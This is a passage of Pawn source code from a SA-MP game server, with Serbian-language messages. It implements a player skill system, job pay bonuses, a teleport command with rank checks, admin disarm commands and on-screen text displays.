        // DestroyDynamic3DTextLabel(helperLabel[playerid]);
        helperVeh[ playerid ] = -1;
    }
    return true;
}

CMD:skills(playerid) {

    new string[128], SkillsString[2048];

    format(string, sizeof(string), ""SRVBOJA1SCM"Trenutni broj skill poena : "col_crvena"%d\n\n", PlayerInfo[playerid][xSkillPoen]);
    strcat(SkillsString, string);

    format(string, sizeof(string), ""SRVBOJA1SCM"WorkAholic\n    -> "col_crvena"Trenutni Nivo :       "SRVBOJA1SCM"%d\n", PlayerInfo[playerid][xSkillWorkAholic]);
    strcat(SkillsString, string);
    format(string, sizeof(string), ""SRVBOJA1SCM"Drive\n    -> "col_crvena"Trenutni Nivo :       "SRVBOJA1SCM"%d\n", PlayerInfo[playerid][xSkillDrive]);
    strcat(SkillsString, string);
    format(string, sizeof(string), ""SRVBOJA1SCM"Stamina\n    -> "col_crvena"Trenutni Nivo :       "SRVBOJA1SCM"%d\n", PlayerInfo[playerid][xSkillStamina]);
    strcat(SkillsString, string);

    SPD(playerid, 0, DIALOG_STYLE_MSGBOX, "Skills", SkillsString, "U redu", "");
    return 1;
}

CMD:skillshelp(playerid) {

    new DialogStrgEx1[ 3000 ];

    strcat( DialogStrgEx1, ""SRVBOJA1SCM"__________________________"col_white" Skill Sistem "SRVBOJA1SCM"__________________________\n\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"Na nasem serveru postoji sistem skill poena i raznih skillova koje nadogradjujete u toku igre!\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"Svaki skill donosi odredjenu prednost.\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"Na svakom level up-u dobijate 1 skill poen koji mozete upotrebiti za odredjeni skill.\n\n");

    strcat( DialogStrgEx1, ""SRVBOJA1SCM"WorkAholic     -> "col_white"Poboljsanjem ovog skilla dobijate veci dobitak novca od poslova.\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"Stamina        -> "col_white"Poboljsanjem ovog skilla manje se umarate pri trcanju i dobijate vise slotova u rancu.\n");
    strcat( DialogStrgEx1, ""SRVBOJA1SCM"Drive          -> "col_white"Poboljsanjem ovog skilla kola su vam brza i manja je sansa za pucanje gume.\n");

    SPD(playerid, 0, DSMSG, ""SRVBOJA1SCM"Skill Sistem", DialogStrgEx1, "Potvrdi", "");
}

checkRanacSlot(playerid) {

    if(PlayerInfo[playerid][xSkillStamina] == 0) {

        PlayerInfo[playerid][xRanac] = 3;
        SavePlayer(playerid);
        return 1;
    }
    if(PlayerInfo[playerid][xSkillStamina] == 1) {

        PlayerInfo[playerid][xRanac] = 4;
        SavePlayer(playerid);
        SendSkillMessage(playerid, "Dobio si povecanje slotova u torbi! Broj slotova : %d .", PlayerInfo[playerid][xRanac]);
        return 1;
    }
    if(PlayerInfo[playerid][xSkillStamina] == 2) {

        PlayerInfo[playerid][xRanac] = 5;
        SavePlayer(playerid);
        SendSkillMessage(playerid, "Dobio si povecanje slotova u torbi! Broj slotova : %d .", PlayerInfo[playerid][xRanac]);
        return 1;
    }
    if(PlayerInfo[playerid][xSkillStamina] == 3) {

        PlayerInfo[playerid][xRanac] = 6;
        SavePlayer(playerid);
        SendSkillMessage(playerid, "Dobio si povecanje slotova u torbi! Broj slotova : %d .", PlayerInfo[playerid][xRanac]);
        return 1;
    }
    if(PlayerInfo[playerid][xSkillStamina] == 4) {

        PlayerInfo[playerid][xRanac] = 7;
        SavePlayer(playerid);
        SendSkillMessage(playerid, "Dobio si povecanje slotova u torbi! Broj slotova : %d .", PlayerInfo[playerid][xRanac]);
        return 1;
    }
    if(PlayerInfo[playerid][xSkillStamina] == 5) {

        PlayerInfo[playerid][xRanac] = 8;
        SavePlayer(playerid);
        SendSkillMessage(playerid, "Dobio si povecanje slotova u torbi! Broj slotova : %d .", PlayerInfo[playerid][xRanac]);
        return 1;
    }

    return 1;
}

CMD:upgradeskill(playerid) {

    if(PlayerInfo[playerid][xSkillPoen] == 0) return SendErrorMessage(playerid, "Nemas nijedan skill poen!");

    SPD(playerid, dialog_UpgradeSkill, DIALOG_STYLE_LIST, "Odaberi Skill", "WorkAholic\nDrive\nStamina", "Odaberi", "Odustani");

    return 1;
}

CMD:setskill(playerid, params[]) {

    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");
    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

    new item[ 32 ], id, level;
    if( sscanf( params, "s[32]du", item, level, id ) ) {
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
        SendUsageMessage( playerid, "/setskill [skill] [skill level] [ ID/Deo imena ]");
        SCM( playerid, BELA, "[SKILLOVI] WorkAholic, Drive, Stamina");
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
        return 1;
    }
    if(level > 5 || level < 0) return SendErrorMessage(playerid, "Level ne moze biti manji od 0 ili veci od 5!");
    if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );

    if( strcmp( item, "workaholic", true ) == 0 ) {
        PlayerInfo[ id ][ xSkillWorkAholic ] = level;
        SavePlayer(id);
        SendInfoMessage(id, "Administrator %s ti je postavio skill level WorkAholic na %d!", ImeIgraca(playerid), level);
        SendInfoMessage(playerid, "Postavio si WorkAholic skill igracu %s na %d!", ImeIgraca(id), level);
    }
    else if( strcmp( item, "drive", true ) == 0 ) {
        PlayerInfo[ id ][ xSkillDrive ] = level;
        SavePlayer(id);
        SendInfoMessage(id, "Administrator %s ti je postavio skill level Drive na %d!", ImeIgraca(playerid), level);
        SendInfoMessage(playerid, "Postavio si Drive skill igracu %s na %d!", ImeIgraca(id), level);
    }
    else if( strcmp( item, "stamina", true ) == 0 ) {
        PlayerInfo[ id ][ xSkillStamina ] = level;
        SavePlayer(id);
        PostaviStamina(id);
        checkRanacSlot(id);
        SendInfoMessage(id, "Administrator %s ti je postavio skill level Stamina na %d!", ImeIgraca(playerid), level);
        SendInfoMessage(playerid, "Postavio si Stamina skill igracu %s na %d!", ImeIgraca(id), level);
    }
    else {

        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
        SendUsageMessage( playerid, "/setskill [skill] [skill level] [ ID/Deo imena ]");
        SCM( playerid, BELA, "[SKILLOVI] Speech, WorkAholic, Drive, Stamina");
        SCM( playerid, SVETLOPLAVA, "___________________________________________________________________");
        return 1;
    }

    return 1;
}

PostaviStamina(playerid) {

    SetPlayerMaxStamina(playerid, 6);
    if(PlayerInfo[playerid][xSkillStamina] == 0) {

       SetPlayerStamina(playerid, 1); 
       GivePlayerSprintVelocity(playerid, 0.7);
       return 1;
    }
    if(PlayerInfo[playerid][xSkillStamina] == 1)  {

        SetPlayerStamina(playerid, 2);
        GivePlayerSprintVelocity(playerid, 1.0);
        return 1;
    }
    if(PlayerInfo[playerid][xSkillStamina] == 2)  {

        SetPlayerStamina(playerid, 3);
        GivePlayerSprintVelocity(playerid, 1.2);
        return 1;
    }
    if(PlayerInfo[playerid][xSkillStamina] == 3)  {

        SetPlayerStamina(playerid, 4);
        GivePlayerSprintVelocity(playerid, 1.4);
        return 1;
    }
    if(PlayerInfo[playerid][xSkillStamina] == 4)  {

        SetPlayerStamina(playerid, 5);
        GivePlayerSprintVelocity(playerid, 1.7);
        return 1;
    }
    if(PlayerInfo[playerid][xSkillStamina] == 5)  {

        SetPlayerStamina(playerid, 6);
        GivePlayerSprintVelocity(playerid, 2.0);
        return 1;
    }
    return 1;
}

ptask Sprintanje[1000](playerid) {

    if(IsPlayerNPC(playerid)) return 1;
    if(NaDmEventu[playerid]) return 1;
    if(WARPInfo[ playerid ][ warID ] != -1) return 1;
    if(IsPlayerRunning(playerid)) {

        TrcanjeVarijabla[playerid]++;
        if(GetPlayerStamina(playerid) == 1) {

            if(TrcanjeVarijabla[playerid] >= 13) {

                TrcanjeVarijabla[playerid] = 0;
                SetPlayerExhausted(playerid, true); 
                return 1;
            }
        }
        else if(GetPlayerStamina(playerid) == 2) {

            if(TrcanjeVarijabla[playerid] >= 25) {

                TrcanjeVarijabla[playerid] = 0;
                SetPlayerExhausted(playerid, true); 
                return 1;
            }
        }
        else if(GetPlayerStamina(playerid) == 3) {

            if(TrcanjeVarijabla[playerid] >= 40) {

                TrcanjeVarijabla[playerid] = 0;
                SetPlayerExhausted(playerid, true); 
                return 1;
            }
        }
        else if(GetPlayerStamina(playerid) == 4) {

            if(TrcanjeVarijabla[playerid] >= 80) {

                TrcanjeVarijabla[playerid] = 0;
                SetPlayerExhausted(playerid, true); 
                return 1;
            }
        }
        else if(GetPlayerStamina(playerid) == 5) {

            if(TrcanjeVarijabla[playerid] >= 120) {

                TrcanjeVarijabla[playerid] = 0;
                SetPlayerExhausted(playerid, true); 
                return 1;
            }
        }
        else if(GetPlayerStamina(playerid) == 6) {

            if(TrcanjeVarijabla[playerid] >= 9999) {

                TrcanjeVarijabla[playerid] = 0;
                SetPlayerExhausted(playerid, true); 
                return 1;
            }
        }
    }
    else return TrcanjeVarijabla[playerid]--;
    return 1;
}

public OnPlayerStaminaOver(playerid) {

    return 1;
}

dajSkillPoen(playerid, kolicina) {

    PlayerInfo[playerid][xSkillPoen] += kolicina;
    SavePlayer(playerid);

    if(kolicina == 1) return SendSkillMessage(playerid, "Dobio si skill poen! Koristi /upgradeskill");
    else return SendSkillMessage(playerid, "Dobio si %d skill poena! Koristi /upgradeskill", kolicina);
}

dajPlatuIgracu(playerid, novac) {

    PlayerInfo[playerid][xDeliveryBroj]++;

    CheckJobSkill(playerid);

    calculateKey(playerid);

    new procenat;
    if(PlayerInfo[playerid][xSkillWorkAholic] == 1) {

        novac += (novac * 5) / 100;
        procenat = 5;
    }
    if(PlayerInfo[playerid][xSkillWorkAholic] == 2) {

        novac += (novac * 10) / 100;
        procenat = 10;
    }
    if(PlayerInfo[playerid][xSkillWorkAholic] == 3) {

        novac += (novac * 15) / 100;
        procenat = 15;
    }
    if(PlayerInfo[playerid][xSkillWorkAholic] == 4) {

        novac += (novac * 20) / 100;
        procenat = 20;
    }
    if(PlayerInfo[playerid][xSkillWorkAholic] == 5) {

        novac += (novac * 25) / 100;
        procenat = 25;
    }
    if(PlayerInfo[playerid][xSkillWorkAholic] != 0) SendSkillMessage(playerid, "Dobio si povecanje dobitka novca zbog WorkAholic Skill-a za %d posto!", procenat);

    if(PlayerInfo[playerid][xJobSkill] == 1) novac += 200;
    if(PlayerInfo[playerid][xJobSkill] == 2) novac += 500;
    if(PlayerInfo[playerid][xJobSkill] == 3) novac += 1000;
    if(PlayerInfo[playerid][xJobSkill] == 4) novac += 1500;
    if(PlayerInfo[playerid][xJobSkill] == 5) novac += 2000;

    if(PlayerInfo[playerid][xVIPLevel] == 1) {

        novac += (novac * 5) / 100;
        procenat = 5;
    }
    if(PlayerInfo[playerid][xVIPLevel] == 2) {

        novac += (novac * 15) / 100;
        procenat = 15;
    }
    if(PlayerInfo[playerid][xVIPLevel] == 3) {

        novac += (novac * 25) / 100;
        procenat = 25;
    }
    if(PlayerInfo[playerid][xVIPLevel] == 4) {

        novac += (novac * 35) / 100;
        procenat = 35;
    }
    if(PlayerInfo[playerid][xVIPLevel] == 5) {

        novac += (novac * 40) / 100;
        procenat = 40;
    }
    if(PlayerInfo[playerid][xVIPLevel] == 6) {

        novac += (novac * 50) / 100;
        procenat = 50;
    }
    if(PlayerInfo[playerid][xVIPLevel] != 0) SendInfoMessage(playerid, "Dobio si povecanje dobitka plate za %d posto zato sto si VIP Level %d!", procenat, PlayerInfo[playerid][xVIPLevel]);

    PlayerInfo[playerid][xPlatniRacun] += novac;
    SavePlayer(playerid);

    new string1[ 128 ]; 
    format( string1, sizeof( string1 ), "Igrac %s je zavrsio turu posla %s", ImeIgraca(playerid), getJobName(PlayerInfo[playerid][xPosao]));
    LogSave( "Ostalo/PosloviLog.log", string1 );

    return 1;
}

timer poletanjeRakete[10000](playerid) {

    astronautCP[playerid] = 1;

    SetPlayerWeather(playerid, 67);
    SetPlayerTime(playerid, 5, 0);

    Novi_SetPlayerPos(playerid, 1916.3341,1454.7102,1094.4314);
    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
    SetCameraBehindPlayer( playerid );

    Novi_SetPlayerCheckpoint(playerid, 1931.8480,1469.1768,1094.4314, 2.0);

    SendJobMessage(playerid, "Idi uzmi alat!");

    return 1;
}

// timer astronautPopravkaTimer[15000](playerid) {

//     ClearAnimations(playerid);

//     Novi_SetPlayerPos(playerid, 1880.2297,1469.2404,1094.7405);
//     SetCameraBehindPlayer(playerid);

//     TogglePlayerControllable(playerid, true);

//     Novi_SetPlayerCheckpoint(playerid, 1912.4584,1469.2087,1094.5245, 2.0);

//     SendJobMessage(playerid, "Sada idi i resetuj postavke broda!");

//     return 1;
// }

floridaGranica1Podigni() {

    MoveDynamicObject(granicaLSFlorida, 3732.05176, -970.64832, 10.92180, 7000, 0.00000, 18.00000, -61.00000);
    defer zatvoriGranicuFlorida1();

    return 1;
}

timer zatvoriGranicuFlorida1[7000]() {

    floridaGranica1Spusti();

    return 1;
}

floridaGranica1Spusti() {

    MoveDynamicObject(granicaLSFlorida, 3732.051757, -970.648254, 10.921833, 7000, 0.000000, 90.000000, -60.699993);

    return 1;
}

///////////////////////////////////////////////

floridaGranica2Podigni() {

    MoveDynamicObject(granicaFloridaLS, 3721.98828, -976.29602, 10.92180, 7000, 0.00000, 25.00000, 119.00000);
    defer zatvoriGranicuFlorida2();

    return 1;
}

timer zatvoriGranicuFlorida2[7000]() {

    floridaGranica2Spusti();

    return 1;
}

floridaGranica2Spusti() {

    MoveDynamicObject(granicaFloridaLS, 3721.988281, -976.295959, 10.921833, 7000, 0.000000, 90.000000, 119.300003);

    return 1;
}

alias:port("aport", "hport", "vport", "pport");
CMD:port(playerid) {

    if(portSeIgrac[playerid]) return SendErrorMessage(playerid, "Ne mozes to u toku portanja!");
    if(RanjenIgrac[playerid]) return SendErrorMessage(playerid, "Ne mozes dok si ranjen!");
    if(!canPlayerTeleport(playerid)) return SendErrorMessage(playerid, "Ne mozes to sada!");

    // if(isPlayerWorking(playerid)) return SendErrorMessage(playerid, "Ne mozes to dok radis posao!");

    if(PlayerInfo[playerid][xAdmin] >= 1) {

        if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) {
            if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
            if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas wanted level." );
            if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
        }

        ShowPlayerDialog(playerid, dialog_portVrsta, DIALOG_STYLE_LIST, "Odaberi Vrstu", "Vazne Lokacije\nPoslovi\nOrganizacije", "Odaberi", "Odustani");

        return 1;
    }

    else if(PlayerInfo[playerid][xSupporter] >= 1) {

        // if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti supp na duznosti." );
        if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si u DM Zoni." );
        if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
        if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas wanted level." );
        if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
        
        ShowPlayerDialog(playerid, dialog_portVrsta, DIALOG_STYLE_LIST, "Odaberi Vrstu", "Vazne Lokacije\nPoslovi\nOrganizacije", "Odaberi", "Odustani");

        return 1;
    }

    else if(PlayerInfo[playerid][xVIPLevel] >= 1) {

        if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
        if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si u DM Zoni." );
        if( PoliceDuty[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
        if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
        if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas wanted level." );
        if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
        if( RadiVojnik{playerid}) return SendErrorMessage( playerid, "Ne mozes to dok radis posao!");
        if( RadiSabotazer{playerid}) return SendErrorMessage( playerid, "Ne mozes to dok radis posao!");
        if(GetPlayerVehicleID(playerid) == KombiHangar) return SendErrorMessage(playerid, "Ne mozes to sa ovim vozilom!");

        if( VIPPort[ playerid ] != 0 ) return SendErrorMessage( playerid, "Jos %d sekundi do sledeceg porta.", VIPPort[ playerid ] );

        ShowPlayerDialog(playerid, dialog_portVrsta, DIALOG_STYLE_LIST, "Odaberi Vrstu", "Vazne Lokacije\nPoslovi\nOrganizacije", "Odaberi", "Odustani");

        return 1;
    }

    else if(PlayerInfo[playerid][xPromoter] >= 1) {

        if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
        if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristiti ovu komandu dok si u DM Zoni." );
        if( PoliceDuty[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
        if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok radis posao ili imas uniformu posla." );
        if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok imas wanted level." );
        if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si u jailu." );
        if( RadiVojnik{playerid}) return SendErrorMessage( playerid, "Ne mozes to dok radis posao!");
        if( RadiSabotazer{playerid}) return SendErrorMessage( playerid, "Ne mozes to dok radis posao!");
        if(GetPlayerVehicleID(playerid) == KombiHangar) return SendErrorMessage(playerid, "Ne mozes to sa ovim vozilom!");

        if( PromoterPort[ playerid ] != 0 ) return SendErrorMessage( playerid, "Jos %d sekundi do sledeceg porta.", PromoterPort[ playerid ] );

        ShowPlayerDialog(playerid, dialog_portVrsta, DIALOG_STYLE_LIST, "Odaberi Vrstu", "Vazne Lokacije\nPoslovi\nOrganizacije", "Odaberi", "Odustani");

        return 1;
    }

    else return SendErrorMessage(playerid, "Nisi ovlascen!");
}

timer IstovarDrveca[15000](playerid) {

    TogglePlayerControllable(playerid, true);

    // if(IsValidDynamicObject(posaoDrvaObjekat[playerid]))
    //     DestroyDynamicObject(posaoDrvaObjekat[playerid]);

    prevoziDrva[playerid] = 3;

    Novi_SetPlayerCheckpoint(playerid, 1090.5057,-344.6219,74.6338, 5.0);

    SendJobMessage(playerid, "Vrati se da bi dobio platu!");

    return 1;
}

timer IskrcavanjePutnika[15000](playerid) {

    TogglePlayerControllable(playerid, true);

    radiPilot[playerid] = 3;

    Novi_SetPlayerCheckpoint(playerid, 3611.5486,-880.1899,11.5810, 5.0);

    SendJobMessage(playerid, "Vrati se da bi dobio platu!");

    return 1;
}

astronautTDShow(playerid, bool:shown) {

    if(!shown) {

        astronautTDShowed[playerid] = false;

        for(new i = 0; i < 3; i++) {

            PlayerTextDrawHide(playerid, astronautPopravkaTD[playerid][i]);
            PlayerTextDrawDestroy( playerid, astronautPopravkaTD[playerid][i]);
            astronautPopravkaTD[playerid][i] = PlayerText:INVALID_TEXT_DRAW;
        }
    }
    if(shown) {

        astronautPopravkaTD[playerid][0] = CreatePlayerTextDraw(playerid, 276.249908, 188.444412, "box");
        PlayerTextDrawLetterSize(playerid, astronautPopravkaTD[playerid][0], 0.000000, 5.416669);
        PlayerTextDrawTextSize(playerid, astronautPopravkaTD[playerid][0], 361.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, astronautPopravkaTD[playerid][0], 1);
        PlayerTextDrawColor(playerid, astronautPopravkaTD[playerid][0], -1);
        PlayerTextDrawUseBox(playerid, astronautPopravkaTD[playerid][0], 1);
        PlayerTextDrawBoxColor(playerid, astronautPopravkaTD[playerid][0], 204);
        PlayerTextDrawSetShadow(playerid, astronautPopravkaTD[playerid][0], 0);
        PlayerTextDrawBackgroundColor(playerid, astronautPopravkaTD[playerid][0], 255);
        PlayerTextDrawFont(playerid, astronautPopravkaTD[playerid][0], 1);
        PlayerTextDrawSetProportional(playerid, astronautPopravkaTD[playerid][0], 1);

        astronautPopravkaTD[playerid][1] = CreatePlayerTextDraw(playerid, 285.833312, 188.962966, "Pritisnite slovo");
        PlayerTextDrawLetterSize(playerid, astronautPopravkaTD[playerid][1], 0.263750, 1.231852);
        PlayerTextDrawTextSize(playerid, astronautPopravkaTD[playerid][1], 564.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, astronautPopravkaTD[playerid][1], 1);
        PlayerTextDrawColor(playerid, astronautPopravkaTD[playerid][1], -1);
        PlayerTextDrawSetShadow(playerid, astronautPopravkaTD[playerid][1], 0);
        PlayerTextDrawBackgroundColor(playerid, astronautPopravkaTD[playerid][1], 255);
        PlayerTextDrawFont(playerid, astronautPopravkaTD[playerid][1], 1);
        PlayerTextDrawSetProportional(playerid, astronautPopravkaTD[playerid][1], 1);

        astronautPopravkaTD[playerid][2] = CreatePlayerTextDraw(playerid, 312.083404, 210.740707, "Y");
        PlayerTextDrawLetterSize(playerid, astronautPopravkaTD[playerid][2], 0.524583, 1.833333);
        PlayerTextDrawAlignment(playerid, astronautPopravkaTD[playerid][2], 1);
        PlayerTextDrawColor(playerid, astronautPopravkaTD[playerid][2], -5963521);
        PlayerTextDrawSetShadow(playerid, astronautPopravkaTD[playerid][2], 0);
        PlayerTextDrawBackgroundColor(playerid, astronautPopravkaTD[playerid][2], 255);
        PlayerTextDrawFont(playerid, astronautPopravkaTD[playerid][2], 1);
        PlayerTextDrawSetProportional(playerid, astronautPopravkaTD[playerid][2], 1);

        astronautTDShowed[playerid] = true;

        new randomBr = RandomNew(1, 3);
        if(randomBr == 1) {

            PlayerTextDrawSetString(playerid, astronautPopravkaTD[playerid][2], "Y");
            astronautKey[playerid] = 1;
        }
        else {

            PlayerTextDrawSetString(playerid, astronautPopravkaTD[playerid][2], "N");
            astronautKey[playerid] = 2;
        }

        for(new i = 0; i < 3; i++) {

            PlayerTextDrawShow(playerid, astronautPopravkaTD[playerid][i]);
        }
    }

    return 1;
}

timer astronautTDTimer[1000](playerid) {

    if(astronautPopravkaBroj[playerid] == 15) {

        ClearAnimations(playerid);

        Novi_SetPlayerPos(playerid, 1880.2297,1469.2404,1094.7405);
        SetCameraBehindPlayer(playerid);

        TogglePlayerControllable(playerid, true);

        Novi_SetPlayerCheckpoint(playerid, 1912.4584,1469.2087,1094.5245, 2.0);

        SendJobMessage(playerid, "Sada idi i resetuj postavke broda!");

        return 1;
    }

    astronautTDShow(playerid, true);

    return 1;
}

// updateDoPlateTD(playerid) {

//     new stringic[64];
//     PlayerTextDrawHide(playerid, DoPlateTD[playerid]);
//     format( stringic, sizeof(stringic), "DO_PLATE:_%d_MIN", (60-PlayerInfo[ playerid ][ xPayDay ]));
//     PlayerTextDrawSetString(playerid, DoPlateTD[playerid], stringic);

//     PlayerTextDrawShow(playerid, DoPlateTD[playerid]);

//     return 1;
// }

createHappyHoursTD() {

    HappyHoursTD[0] = TextDrawCreate(499.500000, 102.500000, "box");
    TextDrawLetterSize(HappyHoursTD[0], 0.000000, 0.800000);
    TextDrawTextSize(HappyHoursTD[0], 606.000000, 0.000000);
    TextDrawAlignment(HappyHoursTD[0], 1);
    TextDrawColor(HappyHoursTD[0], 219685375);
    TextDrawUseBox(HappyHoursTD[0], 1);
    TextDrawBoxColor(HappyHoursTD[0], 219685375);
    TextDrawSetShadow(HappyHoursTD[0], 0);
    TextDrawSetOutline(HappyHoursTD[0], 0);
    TextDrawBackgroundColor(HappyHoursTD[0], 255);
    TextDrawFont(HappyHoursTD[0], 1);
    TextDrawSetProportional(HappyHoursTD[0], 1);
    TextDrawSetShadow(HappyHoursTD[0], 0);

    HappyHoursTD[1] = TextDrawCreate(501.500000, 103.375000, "HAPPYHOURS");
    TextDrawLetterSize(HappyHoursTD[1], 0.139000, 0.558750);
    TextDrawAlignment(HappyHoursTD[1], 1);
    TextDrawColor(HappyHoursTD[1], -1);
    TextDrawSetShadow(HappyHoursTD[1], 0);
    TextDrawSetOutline(HappyHoursTD[1], 0);
    TextDrawBackgroundColor(HappyHoursTD[1], 255);
    TextDrawFont(HappyHoursTD[1], 2);
    TextDrawSetProportional(HappyHoursTD[1], 1);
    TextDrawSetShadow(HappyHoursTD[1], 0);

    HappyHoursTD[2] = TextDrawCreate(545.000000, 103.375000, "OFF");
    TextDrawLetterSize(HappyHoursTD[2], 0.139000, 0.558750);
    TextDrawAlignment(HappyHoursTD[2], 1);
    TextDrawColor(HappyHoursTD[2], -16776961);
    TextDrawSetShadow(HappyHoursTD[2], 0);
    TextDrawSetOutline(HappyHoursTD[2], 0);
    TextDrawBackgroundColor(HappyHoursTD[2], 255);
    TextDrawFont(HappyHoursTD[2], 2);
    TextDrawSetProportional(HappyHoursTD[2], 1);
    TextDrawSetShadow(HappyHoursTD[2], 0);


    return 1;
}

happyHoursTDControl(bool:shown) {

    if(shown) { TextDrawSetString(HappyHoursTD[2], "~g~Ukljuceni"); }
    else if(!shown) { TextDrawSetString(HappyHoursTD[2], "~r~Iskljuceni"); }

    foreach(Player, i) {

        for(new k = 0; k < 3; k++) {

            TextDrawShowForPlayer(i, HappyHoursTD[k]);
        }
        
    }

    return 1;
}

happyHoursPlayerTDControl(playerid, bool:shown) {

    if(!shown) {

        for(new k = 0; k < 3; k ++) {

            TextDrawHideForPlayer(playerid, HappyHoursTD[k]);
        }
    }
    else {

        for(new k = 0; k < 3; k ++) {

            TextDrawShowForPlayer(playerid, HappyHoursTD[k]);
        }
    }

    return 1;
}

CMD:ubistva(playerid)
{

    if(PlayerInfo[playerid][xAdmin] < 1) return SendErrorMessage(playerid, "Nisi ovlascen!");

    if (!gDeathList[playerid])
    {
        SendInfoMessage(playerid, "* Ukljucili ste globalne poruke o ubistvima.");

        TextDrawShowForPlayer(playerid, tdDeathList[0]);
        TextDrawShowForPlayer(playerid, tdDeathList[1]);
        TextDrawShowForPlayer(playerid, tdDeathList[2]);
    }
    else
    {
        SendInfoMessage(playerid, "* Iskljucili ste globalne poruke o ubistvima.");
        
        TextDrawHideForPlayer(playerid, tdDeathList[0]);
        TextDrawHideForPlayer(playerid, tdDeathList[1]);
        TextDrawHideForPlayer(playerid, tdDeathList[2]);
    }

    gDeathList[playerid] = !gDeathList[playerid];
    return 1;
}

alias:disarm("gunban");
CMD:disarm(playerid, params[]) {

    if(PlayerInfo[playerid][xAdmin] < 1) return SendErrorMessage(playerid, "Nisi osvlascen!");
    new id;
    if(sscanf(params, "u", id)) return SendUsageMessage(playerid, "/disarm [ID]");

    if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Pogresan ID!");
    if(PlayerInfo[id][xDisarm] == 1) return SendErrorMessage(playerid, "Ovaj igrac vec ima disarm!");

    ResetPlayerWeapons(id);
    PlayerInfo[id][xDisarm] = 1;
    SavePlayer(id);

    SendInfoMessage(playerid, "Dao si igracu %s disarm!", ImeIgraca(id));
    SendInfoMessage(id, "Administrator %s ti je dao disarm!", ImeIgraca(playerid));

    new string[ 128 ]; 
    format( string, sizeof( string ), "Admin %s je dao disarm igracu %s", ImeIgraca( playerid ), ImeIgraca( id ));
    LogSave( "Ostalo/LogDisarm.log", string );

    return 1;
}

alias:undisarm("gunbanukloni");
CMD:undisarm(playerid, params[]) {

    if(PlayerInfo[playerid][xAdmin] < 3) return SendErrorMessage(playerid, "Nisi osvlascen!");
    new id;
    if(sscanf(params, "u", id)) return SendUsageMessage(playerid, "/undisarm [ID]");

    if(!IsPlayerConnected(id)) return SendErrorMessage(playerid, "Pogresan ID!");
    if(PlayerInfo[id][xDisarm] == 0) return SendErrorMessage(playerid, "Ovaj igrac nema disarm!");

    PlayerInfo[id][xDisarm] = 0;
    SavePlayer(id);

    SendInfoMessage(playerid, "Skinuo si igracu %s disarm!", ImeIgraca(id));
    SendInfoMessage(id, "Administrator %s ti je skinuo disarm!", ImeIgraca(playerid));

    new string[ 128 ]; 
    format( string, sizeof( string ), "Admin %s je skinuo disarm igracu %s", ImeIgraca( playerid ), ImeIgraca( id ));
    LogSave( "Ostalo/LogUnDisarm.log", string );

    return 1;
}

CMD:sc( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xMute ] != 0) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete pisati dok ste u zatvoru / Area51.");

    new poruka[ 128 ], string1[ 234 ];
    new orgID = PlayerInfo[playerid][xClan];

    if( PlayerInfo[ playerid ][ xClan ] == 0 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu" );
    if(OI[orgID][oSavez] == 0) return SendErrorMessage(playerid, "Tvoja organizacija nije u savezu!");

    if(sscanf(params, "s[128]", poruka)) return SendUsageMessage( playerid, "/sc [Text]");
    
